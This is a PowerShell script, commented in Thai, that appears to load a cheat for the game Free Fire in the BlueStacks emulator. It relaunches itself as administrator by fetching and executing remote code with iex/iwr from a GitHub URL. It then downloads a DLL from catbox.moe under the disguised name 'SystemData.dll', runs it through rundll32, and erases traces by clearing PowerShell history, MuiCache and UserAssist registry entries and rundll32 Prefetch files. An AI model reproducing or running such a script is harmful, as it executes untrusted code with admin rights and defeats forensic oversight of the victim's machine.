# 1. ตรวจสอบสิทธิ์ Administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าไฟล์และตำแหน่ง
$url = "https://files.catbox.moe/0ukxya.dll"
$fileName = "SystemData.dll" 
$workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
$dllPath = Join-Path $workDir $fileName
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"

# 3. เตรียมโฟลเดอร์ทำงาน
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 4. ดาวน์โหลด DLL
try {
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    exit
}

# 5. สั่งรัน BlueStacks ผ่าน DLL
if (Test-Path $dllPath) {
    if (Test-Path $blueStacksPath) {
        # รัน BlueStacks
        Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dllPath`",Control_RunDLL `"$blueStacksPath`"" -WorkingDirectory $workDir -Wait
    } else {
        # กรณีหา BlueStacks ไม่เจอ ให้รัน DLL เปล่าๆ
        Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dllPath`",Control_RunDLL" -WorkingDirectory $workDir -Wait
    }
}

# 6. --- เริ่มกระบวนการลบร่องรอย (Deep Clean) ---
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

# ล้างประวัติ PowerShell
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
Clear-History

# ล้าง MuiCache (Registry ประวัติโปรแกรม)
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fileName*" -or $_ -like "*rundll32*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
}

# ล้าง UserAssist (ประวัติการรันของ User)
$uaPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
Get-ChildItem -Path $uaPath -ErrorAction SilentlyContinue | Get-ChildItem | Get-ChildItem | Where-Object { $_.Name -like "*$fileName*" } | Remove-Item -Force -ErrorAction SilentlyContinue

# ล้าง Prefetch ของ Rundll32
Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*RUNDLL32*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# รีสตาร์ท Explorer เพื่อเคลียร์ Cache ใน RAM
Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
Start-Process Explorer